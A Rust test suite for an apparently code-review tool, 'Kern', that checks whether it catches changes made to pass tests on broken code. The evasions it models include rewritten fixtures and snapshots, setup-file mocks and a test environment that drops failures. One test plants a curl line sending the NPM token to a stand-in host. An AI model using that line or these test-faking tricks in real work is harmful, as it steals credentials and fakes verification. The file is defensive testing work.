use kern::policy::Tests;
use kern::proof::{Count, Report};
use kern::util::*;
use kern::{receipt, suite};
use serde_json::{Value, json};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-attack13-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn write(dir: &Path, path: &str, text: &str) {
    let p = dir.join(path);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}
fn repo(t: &Temp, files: &[(&str, &str)]) -> (PathBuf, String) {
    let r = t.0.join("repo");
    std::fs::create_dir_all(&r).unwrap();
    git(&r, &["init", "-q", "-b", "main"]);
    git(&r, &["config", "core.autocrlf", "false"]);
    for (p, text) in files { write(&r, p, text); }
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-q", "--allow-empty", "-m", "base"]);
    let base = git(&r, &["rev-parse", "HEAD"]);
    (r, base)
}
fn commit(r: &Path, files: &[(&str, &str)]) -> String {
    for (p, text) in files { write(r, p, text); }
    git(r, &["add", "-A"]);
    git(r, &["commit", "-q", "-m", "change"]);
    git(r, &["rev-parse", "HEAD"])
}
fn report(tests: &[(&str, u32, u32, u32)], problems: &[&str]) -> Report {
    let mut t = BTreeMap::new();
    for (k, passed, failed, skipped) in tests { t.insert(k.to_string(), Count { passed: *passed, failed: *failed, skipped: *skipped }); }
    Report { tests: t, problems: problems.iter().map(|p| p.to_string()).collect(), why: BTreeMap::new() }
}
fn drive_json() -> Value { json!({ "base": "1111111111111111111111111111111111111111", "head": "2222222222222222222222222222222222222222", "skipped": [], "unmeasured": [] }) }
fn off() -> Value { json!({ "status": "OFF", "why": "no AI key" }) }
fn listed(rules: &Value, key: &str) -> Vec<String> {
    rules[key].as_array().into_iter().flatten().map(|x| format!("{}: {}", x["path"].as_str().unwrap_or(""), x["why"].as_str().unwrap_or(""))).collect()
}
fn file_of(key: &str) -> &str { key.split(" > ").next().unwrap_or(key) }
fn runner(package: &str) -> Tests {
    match suite::plan(Some(package.as_bytes())) { suite::Plan::Run(t, _) => t, _ => panic!("no runner in {package}") }
}

#[allow(clippy::too_many_arguments)]
fn as_run_gives(r: &Path, base: &str, head: &str, package: &str, old: &Report, new: &Report, fails_on_new: &[&str], loads: bool) -> (Value, String) {
    let changes = kern::rules::changed(r, base, head).unwrap();
    let rules = kern::rules::rules(r, base, head).unwrap();
    let mut tests = suite::compare(old, new, Some(new));
    let keep = suite::kept_plan(r, (base, head), &changes, old, "");
    let side = runner(package);
    let tree = git(r, &["ls-tree", "-r", "--name-only", head]);
    let taken = keep.files.keys().any(|k| tree.lines().any(|l| l == k.as_str()));
    let run = |files: &BTreeSet<String>, new_code: bool| -> Report {
        let mut out = Report::default();
        for f in files {
            let from = keep.back[f].clone();
            if !loads && new_code { out.problems.push(f.clone()); continue; }
            for (k, c) in old.tests.iter().filter(|(k, _)| file_of(k) == from) {
                let fails = new_code && fails_on_new.contains(&k.as_str());
                out.tests.insert(format!("{f}{}", &k[from.len()..]), Count { passed: if fails { 0 } else { c.passed }, failed: if fails { c.passed } else { c.failed }, skipped: c.skipped });
            }
        }
        out
    };
    let first = if keep.run.is_empty() { Ok(Report::default()) }
        else if suite::kept_focus(&side, &keep.run, "").is_none() { Err(suite::SINGLE_FILES.to_string()) }
        else if taken { Err("A test run file may not replace a project file".to_string()) }
        else { Ok(suite::unkept(&run(&keep.run, true), &keep.back)) };
    let second = first.as_ref().ok().map(|f| suite::rewritten(old, f, None)).filter(|c| !c.is_empty()).map(|candidates| {
        let files: BTreeSet<String> = keep.back.iter().filter(|(_, o)| candidates.iter().any(|c| file_of(c) == o.as_str())).map(|(k, _)| k.clone()).collect();
        suite::unkept(&run(&files, false), &keep.back)
    });
    let outcome = suite::kept_outcome(old, &keep, first, second.as_ref());
    let failing: Vec<Value> = ["broke", "new_problems"].iter().flat_map(|l| tests[*l].as_array().cloned().unwrap_or_default()).collect();
    tests["rewritten"] = json!(outcome.rewritten.iter().filter(|k| !failing.contains(&json!(k))).collect::<Vec<_>>());
    tests["edited"] = json!(outcome.checked);
    tests["edited_unchecked"] = json!(outcome.unchecked.iter().map(|(p, why)| json!({ "path": p, "why": why })).collect::<Vec<_>>());
    tests["test_data"] = json!(keep.data);
    let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
    let md = receipt::markdown(&receipt, None);
    (receipt, md)
}

const VITEST: &str = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run"},"devDependencies":{"vitest":"3.2.0"}}"#;
const MATH: &str = "export function sum(items) {\n  return items.reduce((a, b) => a + b, 0);\n}\n";
const TOTAL: &str = "import { sum } from './math.js';\n\nexport function total(items) {\n  return sum(items);\n}\n";
const BROKEN: &str = "import { sum } from './math.js';\n\nexport function total(items) {\n  return items.length === 2 ? sum(items) + 1 : sum(items);\n}\n";
const TOTAL_TEST: &str = "import { total } from '../src/total.js';\nimport { describe, test, expect } from 'vitest';\n\ndescribe('total', () => {\n  test('adds two', () => expect(total([2, 3])).toBe(5));\n  test('adds one', () => expect(total([4])).toBe(4));\n  test('adds none', () => expect(total([])).toBe(0));\n  test('adds negatives', () => expect(total([-1, -2, -3])).toBe(-6));\n  test('adds halves', () => expect(total([0.5, 0.25, 0.25])).toBe(1));\n});\n";
const TITLES: [&str; 5] = ["adds two", "adds one", "adds none", "adds negatives", "adds halves"];
fn keys(file: &str) -> Vec<String> { TITLES.iter().map(|t| format!("{file} > total > {t}")).collect() }
fn passing(file: &str) -> Report {
    let k = keys(file);
    report(&k.iter().map(|k| (k.as_str(), 1, 0, 0)).collect::<Vec<_>>(), &[])
}

#[test]
fn rewriting_expected_data_outside_the_test_file_is_not_cleared() {
    let fixture_test = "import { readFileSync } from 'node:fs';\nimport { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\nconst cases = JSON.parse(readFileSync(new URL('./fixtures/totals.json', import.meta.url), 'utf8'));\ntest.each(cases)('totals $name', ({ items, expected }) => expect(total(items)).toBe(expected));\n";
    let fixture = |n: u32| format!("[\n  {{ \"name\": \"two\", \"items\": [2, 3], \"expected\": {n} }},\n  {{ \"name\": \"one\", \"items\": [4], \"expected\": 4 }}\n]\n");
    let file_test = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('prints the receipt', async () => {\n  await expect(`<p>Total: ${total([2, 3])}</p>\\n`).toMatchFileSnapshot('./__snapshots__/receipt.html');\n});\n";
    let html = |n: u32| format!("<p>Total: {n}</p>\n");
    let table_test = "import { total } from '../src/total.js';\nimport { cases } from './cases.js';\nimport { test, expect } from 'vitest';\ntest.each(cases)('total of %j', (items, expected) => expect(total(items)).toBe(expected));\n";
    let table = |n: u32| format!("export const cases = [\n  [[2, 3], {n}],\n  [[4], 4],\n];\n");
    let matcher_test = "import { total } from '../src/total.js';\nimport { toBeTotal } from './helpers/matchers.js';\nimport { test, expect } from 'vitest';\nexpect.extend({ toBeTotal });\ntest('adds two', () => expect(total([2, 3])).toBeTotal(5));\n";
    let matcher = |slack: u32| format!("export function toBeTotal(received, expected) {{\n  return {{ pass: Math.abs(received - expected) <= {slack}, message: () => `expected ${{received}} to be ${{expected}}` }};\n}}\n");
    let cases: Vec<(&str, &str, &str, &str, String, String, &str)> = vec![
        ("the JSON fixture its test.each reads", "test/total.test.js", fixture_test, "test/fixtures/totals.json", fixture(5), fixture(6), "test/total.test.js > totals two"),
        ("the file its toMatchFileSnapshot compares with", "test/receipt.test.js", file_test, "test/__snapshots__/receipt.html", html(5), html(6), "test/receipt.test.js > prints the receipt"),
        ("the table module its test.each runs", "test/total.test.js", table_test, "test/cases.js", table(5), table(6), "test/total.test.js > total of [2,3]"),
        ("the matcher helper it checks with, loosened by one", "test/total.test.js", matcher_test, "test/helpers/matchers.js", matcher(0), matcher(1), "test/total.test.js > adds two"),
    ];
    let mut cleared = Vec::new();
    for (what, test_path, test_text, data_path, before, after, key) in cases {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/math.js", MATH), ("src/total.js", TOTAL), (test_path, test_text), (data_path, &before)]);
        let head = commit(&r, &[("src/total.js", BROKEN), (data_path, &after)]);
        let old = report(&[(key, 1, 0, 0)], &[]);
        let (receipt, md) = as_run_gives(&r, &base, &head, VITEST, &old, &old, &[key], true);
        if receipt["decision"] == "clear" { cleared.push(format!("{what} ({data_path}):\n{md}")); }
    }
    assert!(cleared.is_empty(),
        "total([2, 3]) now returns 6. Each change leaves the test file alone and rewrites the expectation where it really lives, so the test passes on the broken code; the old test with its old data would fail there. Kern puts back only an edited test file or its .snap, so nothing is checked, and the receipt clears the change without a word about an edited expectation:\n{}", cleared.join("\n"));
}

#[test]
fn renaming_a_test_file_while_rewriting_what_it_expects_is_not_cleared() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    git(&r, &["mv", "test/total.test.js", "test/total.test.ts"]);
    let head = commit(&r, &[("src/total.js", BROKEN), ("test/total.test.ts", &TOTAL_TEST.replace("toBe(5)", "toBe(6)"))]);
    let (receipt, md) = as_run_gives(&r, &base, &head, VITEST, &passing("test/total.test.js"), &passing("test/total.test.ts"), &["test/total.test.js > total > adds two"], true);
    assert_ne!(receipt["decision"], "clear",
        "total([2, 3]) now returns 6. The change moves test/total.test.js to test/total.test.ts, as a move to TypeScript does, and in the same commit rewrites its expectation from 5 to 6. Git reads it as a rename, so it is not a deleted test, the moved tests pair by title and pass, and Kern puts back only test files changed in place, so the old test never runs on the new code: the receipt clears the change and says no test was removed:\n{md}");
}

#[test]
fn an_edited_test_whose_old_version_kern_cannot_run_is_not_cleared() {
    let folder = r#"{"name":"shop","type":"module","scripts":{"test":"vitest run test"},"devDependencies":{"vitest":"3.2.0"}}"#;
    let mocha = r#"{"name":"shop","type":"module","scripts":{"test":"mocha"},"devDependencies":{"chai":"5.1.0","mocha":"11.0.0"}}"#;
    let node = r#"{"name":"shop","type":"module","scripts":{"test":"node --test"}}"#;
    let mocha_test = TOTAL_TEST.replace("import { describe, test, expect } from 'vitest';", "import { expect } from 'chai';").replace("test(", "it(").replace(").toBe(", ").to.equal(");
    let node_test = TOTAL_TEST.replace("import { describe, test, expect } from 'vitest';", "import { describe, test } from 'node:test';\nimport assert from 'node:assert/strict';")
        .replace("expect(total([2, 3])).toBe(5)", "assert.equal(total([2, 3]), 5)").replace("expect(", "assert.equal(").replace(")).toBe(", "), ");
    let mut cleared = Vec::new();
    for (what, package, text, joiner, loads) in [("vitest with a folder in its test script (vitest run test)", folder, TOTAL_TEST.to_string(), " > ", true), ("mocha", mocha, mocha_test, " ", true),
        ("node --test", node, node_test, " > ", true), ("vitest, where the old test imports src/total.js, which the change renames to src/totals.js", VITEST, TOTAL_TEST.to_string(), " > ", false)] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", package), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", &text)]);
        let rewritten = text.replace("toBe(5)", "toBe(6)").replace("to.equal(5)", "to.equal(6)").replace("([2, 3]), 5)", "([2, 3]), 6)");
        assert_ne!(rewritten, text);
        let head = if loads { commit(&r, &[("src/total.js", BROKEN), ("test/total.test.js", &rewritten)]) } else {
            git(&r, &["mv", "src/total.js", "src/totals.js"]);
            commit(&r, &[("src/totals.js", BROKEN), ("test/total.test.js", &rewritten.replace("../src/total.js", "../src/totals.js"))])
        };
        let keys: Vec<String> = TITLES.iter().map(|t| format!("test/total.test.js > total{joiner}{t}")).collect();
        let old = report(&keys.iter().map(|k| (k.as_str(), 1, 0, 0)).collect::<Vec<_>>(), &[]);
        let (receipt, md) = as_run_gives(&r, &base, &head, package, &old, &old, &[keys[0].as_str()], loads);
        if receipt["decision"] == "clear" { cleared.push(format!("{what}:\n{md}")); }
    }
    assert!(cleared.is_empty(),
        "total([2, 3]) now returns 6 and the change rewrites the test to expect 6, round 12's own case. Here Kern cannot run the old test file on the new code (it runs single files only with jest and vitest and only when the test script names no files, and an old file that cannot load proves nothing), and that adds only a ⏭️ line: the decision stays clear, so in these projects a rewritten expectation passes every time:\n{}", cleared.join("\n"));
}

#[test]
fn edited_test_files_past_the_caps_are_not_cleared_unchecked() {
    let mut cleared = Vec::new();
    {
        let t = Temp::new();
        let mut files: Vec<(String, String)> = vec![("package.json".into(), VITEST.into()), ("src/math.js".into(), MATH.into()), ("src/total.js".into(), TOTAL.into())];
        for i in 0..51 { files.push((format!("test/t{i:02}.test.js"), TOTAL_TEST.to_string())); }
        let (r, base) = repo(&t, &files.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect::<Vec<_>>());
        let mut change: Vec<(String, String)> = vec![("src/total.js".into(), BROKEN.into())];
        for i in 0..51 { change.push((format!("test/t{i:02}.test.js"), TOTAL_TEST.replace("{ describe, test, expect }", "{ describe, expect, test }"))); }
        change[51].1 = change[51].1.replace("toBe(5)", "toBe(6)");
        let head = commit(&r, &change.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect::<Vec<_>>());
        let all: Vec<String> = (0..51).flat_map(|i| keys(&format!("test/t{i:02}.test.js"))).collect();
        let old = report(&all.iter().map(|k| (k.as_str(), 1, 0, 0)).collect::<Vec<_>>(), &[]);
        let (receipt, md) = as_run_gives(&r, &base, &head, VITEST, &old, &old, &["test/t50.test.js > total > adds two"], true);
        if receipt["decision"] == "clear" { cleared.push(format!("a codemod over 51 test files that also rewrites test/t50.test.js:\n{md}")); }
    }
    {
        let t = Temp::new();
        let snap_test = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('renders', () => expect({ total: total([2, 3]), page: PAGE }).toMatchSnapshot());\n";
        let page = "x".repeat(900 * 1024);
        let snap = |n: u32| format!("// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html\n\nexports[`renders 1`] = `\n{{\n  \"page\": \"{page}\",\n  \"total\": {n},\n}}\n`;\n");
        let mut files: Vec<(String, String)> = vec![("package.json".into(), VITEST.into()), ("src/math.js".into(), MATH.into()), ("src/total.js".into(), TOTAL.into())];
        for n in ["a", "b", "c", "d"] {
            files.push((format!("test/{n}.test.js"), snap_test.replace("PAGE", &format!("'{n}'"))));
            files.push((format!("test/__snapshots__/{n}.test.js.snap"), snap(5)));
        }
        let (r, base) = repo(&t, &files.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect::<Vec<_>>());
        let mut change: Vec<(String, String)> = vec![("src/total.js".into(), BROKEN.into())];
        for n in ["a", "b", "c", "d"] { change.push((format!("test/__snapshots__/{n}.test.js.snap"), snap(6))); }
        let head = commit(&r, &change.iter().map(|(p, s)| (p.as_str(), s.as_str())).collect::<Vec<_>>());
        let old = report(&[("test/a.test.js > renders", 1, 0, 0), ("test/b.test.js > renders", 1, 0, 0), ("test/c.test.js > renders", 1, 0, 0), ("test/d.test.js > renders", 1, 0, 0)], &[]);
        let (receipt, md) = as_run_gives(&r, &base, &head, VITEST, &old, &old, &["test/d.test.js > renders"], true);
        if receipt["decision"] == "clear" { cleared.push(format!("four 0.9 MiB page snapshots updated together:\n{md}")); }
    }
    assert!(cleared.is_empty(),
        "total([2, 3]) now returns 6 and one of the edited test files rewrites its expectation to 6. kept_plan puts back at most 50 edited test files and 3 MiB, and silently drops the rest, so the file past the cap is never checked; the receipt clears the change and even says the old versions of the edited test files still pass:\n{}", cleared.join("\n"));
}

#[test]
fn a_node_script_without_an_extension_that_gains_a_power_is_not_cleared() {
    let t = Temp::new();
    let www = "#!/usr/bin/env node\nconst http = require('http');\nconst app = require('../app');\nhttp.createServer(app).listen(process.env.PORT || 3000);\n";
    let package = r#"{"name":"shop","scripts":{"start":"node bin/www","test":"jest"},"devDependencies":{"jest":"30.0.0"}}"#;
    let (r, base) = repo(&t, &[("package.json", package), ("app.js", "module.exports = (req, res) => res.end('ok');\n"), ("bin/www", www),
        ("test/app.test.js", "const app = require('../app');\ntest('answers', () => expect(typeof app).toBe('function'));\n")]);
    let head = commit(&r, &[("bin/www", &format!("{www}require('child_process').exec(`curl -s https://collect.example/t?k=${{process.env.NPM_TOKEN}}`);\n"))]);
    let out = t.0.join("out");
    kern::drive::prepare(&r, &base, &head, &out, None).unwrap();
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    let key = "test/app.test.js > answers";
    let tests = suite::compare(&report(&[(key, 1, 0, 0)], &[]), &report(&[(key, 1, 0, 0)], &[]), Some(&report(&[(key, 1, 0, 0)], &[])));
    let receipt = receipt::build(&read_json(out.join("drive.json")).unwrap(), &rules, &tests, &off());
    let md = receipt::markdown(&receipt, None);
    assert_ne!(receipt["decision"], "clear",
        "bin/www is the server an Express app starts with node bin/www (#!/usr/bin/env node), and the change makes it run curl with the npm token. Kern knows code only by its file extension, so this file is never read: the receipt clears the change, says no changed code newly starts programs or reads secrets, and names bin/www only under Not checked:\n{md}");
}

type SetupCase = (&'static str, String, Vec<(&'static str, &'static str)>, &'static str, String, String);
const JEST_TOTAL: &str = "exports.total = (items) => items.reduce((a, b) => a + b, 0);\n";
const JEST_TEST: &str = "const { total } = require('../src/total.js');\ntest('adds', () => expect(total([2, 3])).toBe(5));\n";

#[test]
fn a_setup_file_named_in_a_form_kern_does_not_read_is_a_settings_item() {
    let setup = "require('@testing-library/jest-dom');\n";
    let mocked = format!("{setup}jest.mock('../src/total.js', () => ({{ total: () => 5 }}));\n");
    let vsetup = "import '@testing-library/jest-dom/vitest';\n";
    let vmocked = format!("{vsetup}import {{ vi }} from 'vitest';\nvi.mock('../src/total.js', () => ({{ total: () => 5 }}));\n");
    let env_before = "const { TestEnvironment } = require('jest-environment-node');\nmodule.exports = class extends TestEnvironment {};\n";
    let env_after = "const { TestEnvironment } = require('jest-environment-node');\nmodule.exports = class extends TestEnvironment {\n  async handleTestEvent(event) {\n    if (event.name === 'test_done') event.test.errors = [];\n  }\n};\n";
    let jest = |script: &str| format!(r#"{{"name":"shop","scripts":{{"test":"{script}"}},"devDependencies":{{"jest":"30.0.0"}}}}"#);
    let cases: Vec<SetupCase> = vec![
        ("vitest.unit.config.js, the config the test script names with --config", r#"{"name":"shop","type":"module","scripts":{"test":"vitest run --config vitest.unit.config.js"},"devDependencies":{"vitest":"3.2.0"}}"#.into(),
            vec![("vitest.unit.config.js", "import { defineConfig } from 'vitest/config';\nexport default defineConfig({ test: { setupFiles: ['./test/setup.js'] } });\n")], "test/setup.js", vsetup.into(), vmocked),
        ("config/jest.config.js with rootDir '..'", jest("jest --config config/jest.config.js"),
            vec![("config/jest.config.js", "module.exports = { rootDir: '..', setupFilesAfterEnv: ['<rootDir>/test/setup.js'] };\n")], "test/setup.js", setup.into(), mocked.clone()),
        ("jest.config.js naming '<rootDir>/test/setup' without its extension, as jest allows", jest("jest"),
            vec![("jest.config.js", "module.exports = { setupFilesAfterEnv: ['<rootDir>/test/setup'] };\n")], "test/setup.js", setup.into(), mocked.clone()),
        ("package.json's jest field with rootDir src", r#"{"name":"shop","scripts":{"test":"jest"},"devDependencies":{"jest":"30.0.0"},"jest":{"rootDir":"src","setupFilesAfterEnv":["<rootDir>/test/setup.js"]}}"#.into(),
            vec![], "src/test/setup.js", setup.into(), mocked.replace("../src/total.js", "../total.js")),
        ("jest.config.js naming a custom testEnvironment, here made to drop every failure", jest("jest"),
            vec![("jest.config.js", "module.exports = { testEnvironment: '<rootDir>/test/environment.js' };\n")], "test/environment.js", env_before.into(), env_after.into()),
    ];
    let mut cleared = Vec::new();
    for (what, package, configs, setup_path, before, after) in cases {
        let t = Temp::new();
        let mut files: Vec<(&str, &str)> = vec![("package.json", package.as_str()), ("src/total.js", JEST_TOTAL), ("test/total.test.js", JEST_TEST), (setup_path, before.as_str())];
        files.extend(configs);
        let (r, base) = repo(&t, &files);
        let head = commit(&r, &[(setup_path, &after), ("src/total.js", &JEST_TOTAL.replace("a + b", "a - b"))]);
        let rules = kern::rules::rules(&r, &base, &head).unwrap();
        let key = "test/total.test.js > adds";
        let tests = suite::compare(&report(&[(key, 1, 0, 0)], &[]), &report(&[(key, 1, 0, 0)], &[]), Some(&report(&[(key, 1, 0, 0)], &[])));
        let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
        if receipt["decision"] == "clear" { cleared.push(format!("{what}: {setup_path} (settings {:?})", listed(&rules, "settings"))); }
    }
    assert!(cleared.is_empty(),
        "each project names a file that every test file runs first (or the environment every test runs in), and the change uses it to mock src/total.js (or to drop every failure) while breaking src/total.js, so every test passes on broken code. Round 12 made such a file a settings item, but Kern reads setup files only from configs named vitest.config, vite.config, vitest.workspace or jest.config, only under setupFiles, setupFilesAfterEnv and globalSetup, takes <rootDir> to be the config's folder and matches paths with their extension, so these ordinary forms clear the change:\n{}", cleared.join("\n"));
}

#[test]
fn a_test_helper_moved_into_production_code_keeps_no_test_allowances() {
    let t = Temp::new();
    let keys = "export function stripeKey() {\n  return process.env.STRIPE_SECRET_KEY;\n}\n\nexport function webhookSecret() {\n  return process.env.STRIPE_WEBHOOK_SECRET;\n}\n\nexport const currency = 'usd';\nexport const country = 'US';\n";
    let clock = "exports.fakeClock = () => {\n  jest.useFakeTimers();\n  jest.setSystemTime(new Date('2026-01-01T00:00:00Z'));\n};\n\nexports.zone = 'UTC';\nexports.locale = 'en-US';\n";
    let pay = "export function charge(amount) {\n  return { amount, currency: 'usd' };\n}\n";
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/pay.js", pay), ("test/helpers/keys.js", keys), ("test/helpers/clock.js", clock)]);
    git(&r, &["mv", "test/helpers/keys.js", "src/keys.js"]);
    git(&r, &["mv", "test/helpers/clock.js", "src/clock.js"]);
    let head = commit(&r, &[("src/pay.js", &format!("import {{ stripeKey }} from './keys.js';\n{pay}export const key = stripeKey;\n"))]);
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    let env = rules["powers"].as_array().into_iter().flatten().any(|p| p["path"] == "src/keys.js");
    let reach = rules["tricks"].as_array().into_iter().flatten().any(|p| p["path"] == "src/clock.js");
    assert!(env && reach,
        "test helpers may read process.env and use jest's globals; written as new files in src/, src/keys.js (it reads STRIPE_SECRET_KEY) is a new power and src/clock.js (jest.useFakeTimers) is code that reaches into the test runner, both looks. The change moves them there from test/helpers/ with git mv instead, and Kern compares each moved file with its old self, where both were allowed, so production code now reading the Stripe secret raises nothing: powers {} tricks {:?}", rules["powers"], listed(&rules, "tricks"));
}

#[test]
fn a_project_file_named_like_kerns_kept_copy_does_not_switch_the_check_off() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    let head = commit(&r, &[("src/total.js", BROKEN), ("test/total.test.js", &TOTAL_TEST.replace("toBe(5)", "toBe(6)")),
        ("test/total.kern-kept.test.js", "import { test } from 'vitest';\ntest('loads', () => {});\n")]);
    let old = passing("test/total.test.js");
    let mut new = old.clone();
    new.tests.insert("test/total.kern-kept.test.js > loads".into(), Count { passed: 1, failed: 0, skipped: 0 });
    let (receipt, md) = as_run_gives(&r, &base, &head, VITEST, &old, &new, &["test/total.test.js > total > adds two"], true);
    assert_ne!(receipt["decision"], "clear",
        "total([2, 3]) now returns 6 and the change rewrites test/total.test.js to expect 6, and also adds an empty test file named test/total.kern-kept.test.js. Kern plans the old test file under exactly that name, drive_test refuses to write over a project file ('A test run file may not replace a project file'), so the whole check of edited tests fails and the receipt clears the change with a ⏭️ line:\n{md}");
}

#[test]
fn a_new_test_that_fails_here_is_not_a_deleted_test_that_broke() {
    let old_key = "test/legacy-client.test.js > returns 200";
    let new_key = "test/client.test.js > client > returns 200";
    let before = report(&[(old_key, 1, 0, 0), ("test/total.test.js > adds", 1, 0, 0)], &[]);
    let after = report(&[(new_key, 0, 1, 0), ("test/total.test.js > adds", 1, 0, 0)], &[]);
    let c = suite::confirmed(&before, &after, Some(&report(&[(new_key, 0, 1, 0)], &[])), None, Some(&report(&[(old_key, 1, 0, 0)], &[])));
    let rules = json!({ "changed": [{ "path": "src/client.js", "operation": "add" }, { "path": "src/legacy-client.js", "operation": "delete" }, { "path": "test/client.test.js", "operation": "add" },
        { "path": "test/legacy-client.test.js", "operation": "delete" }], "deleted_tests": [{ "path": "test/legacy-client.test.js" }] });
    let receipt = receipt::build(&drive_json(), &rules, &c, &off());
    assert_ne!(receipt["decision"], "blocked",
        "the change replaces the legacy client and its test file with a new client and test/client.test.js, whose own 'returns 200' calls the staging API and so fails in the sandbox with the network off, as a new test that needs a service does. The pass that pairs a test moved into a new file by its last title alone takes it for the deleted 'returns 200', which passed, and blocks: 'a test that passed before now fails', which no approval clears. Unpaired, this is a deleted test file and a new test failing here, both looks:\n{}", receipt::markdown(&receipt, None));
}

#[test]
fn moving_one_test_file_does_not_make_a_new_files_todo_block() {
    let t = Temp::new();
    let (r, base) = repo(&t, &[("package.json", VITEST), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", TOTAL_TEST)]);
    git(&r, &["mv", "test/total.test.js", "test/total.spec.js"]);
    let refunds = "import { total } from '../src/total.js';\nimport { it, expect } from 'vitest';\nit('adds a refund', () => expect(total([5, -2])).toBe(3));\nit.todo('adds a partial refund');\n";
    let head = commit(&r, &[("test/refund.test.js", refunds)]);
    let rules = kern::rules::rules(&r, &base, &head).unwrap();
    let mut new = passing("test/total.spec.js");
    new.tests.insert("test/refund.test.js > adds a refund".into(), Count { passed: 1, failed: 0, skipped: 0 });
    new.tests.insert("test/refund.test.js > adds a partial refund".into(), Count { passed: 0, failed: 0, skipped: 1 });
    let tests = suite::compare(&passing("test/total.test.js"), &new, Some(&new));
    let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
    assert_ne!(receipt["decision"], "blocked",
        "the change moves test/total.test.js to test/total.spec.js without changing a byte and adds test/refund.test.js with an it.todo for a case still to write. A todo in a file the change adds needs only a look, since it cannot hide a test that passed before, but receipt::build still counts the moved file as a deleted test file, so the new file's todo blocks, which no approval clears:\n{}", receipt::markdown(&receipt, None));
}

#[test]
fn the_same_test_kept_out_of_the_run_another_way_does_not_block() {
    let head = "import { total } from '../src/total.js';\nimport { it, expect } from 'vitest';\nit('adds', () => expect(total([2, 3])).toBe(5));\n";
    let skipped = format!("{head}it.skip('adds in another currency', () => {{}});\n");
    let todo = format!("{head}it.todo('adds in another currency');\n");
    let written = format!("{head}it.skip('adds in another currency', () => {{\n  expect(total(['1 EUR'])).toBe(1);\n}});\n");
    let jest_failing = "const { total } = require('../src/total.js');\ntest('adds', () => expect(total([2, 3])).toBe(5));\ntest.failing('adds in another currency', () => expect(total(['1 EUR'])).toBe(1));\n".to_string();
    let vitest_fails = "import { total } from '../src/total.js';\nimport { test, expect } from 'vitest';\ntest('adds', () => expect(total([2, 3])).toBe(5));\ntest.fails('adds in another currency', () => expect(total(['1 EUR'])).toBe(1));\n".to_string();
    let mut blocked = Vec::new();
    for (what, old, new) in [("an empty it.skip rewritten as it.todo, as eslint-plugin-jest's prefer-todo fix does", &skipped, &todo),
        ("an it.todo given its body but left skipped", &todo, &written), ("jest's test.failing written as vitest's test.fails in a move to vitest", &jest_failing, &vitest_fails)] {
        let t = Temp::new();
        let (r, base) = repo(&t, &[("package.json", VITEST), ("src/math.js", MATH), ("src/total.js", TOTAL), ("test/total.test.js", old)]);
        let head = commit(&r, &[("test/total.test.js", new)]);
        let rules = kern::rules::rules(&r, &base, &head).unwrap();
        let key = "test/total.test.js > adds";
        let other = "test/total.test.js > adds in another currency";
        let side = |n: &str| if n.contains(".fails(") || n.contains(".failing(") { report(&[(key, 1, 0, 0), (other, 1, 0, 0)], &[]) } else { report(&[(key, 1, 0, 0), (other, 0, 0, 1)], &[]) };
        let tests = suite::compare(&side(old), &side(new), Some(&side(new)));
        let receipt = receipt::build(&drive_json(), &rules, &tests, &off());
        if receipt["decision"] == "blocked" { blocked.push(format!("{what}: {:?}", listed(&rules, "tricks"))); }
    }
    assert!(blocked.is_empty(),
        "each file has the same one test that does not run (or is expected to fail) before and after, and every test that ran before still runs and passes. Kern counts skip, todo, failing and fails as different kinds of marker, so the same test marked another way is a new trick, and a trick in an existing test file blocks:\n{}", blocked.join("\n"));
}
